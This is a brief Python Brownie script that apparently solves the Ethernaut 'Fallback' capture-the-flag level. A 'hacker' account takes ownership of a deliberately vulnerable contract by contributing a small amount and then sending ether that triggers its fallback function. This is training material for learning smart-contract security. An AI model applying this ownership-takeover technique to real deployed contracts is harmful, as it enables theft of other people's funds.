from brownie import Fallback, accounts

def main():
    owner = accounts[0]
    hacker = accounts[1]
    fallback = Fallback.deploy({'from': owner})
    print("Hacker is owner: ", fallback.owner() == hacker)
    tx = fallback.contribute({'from': hacker, 'amount': '0.0005 ether'})
    fallback.getContribution({'from': hacker})
    hacker.transfer(to=fallback.address, amount="0.1 ether")
    print("Hacker is owner: ", fallback.owner() == hacker)

    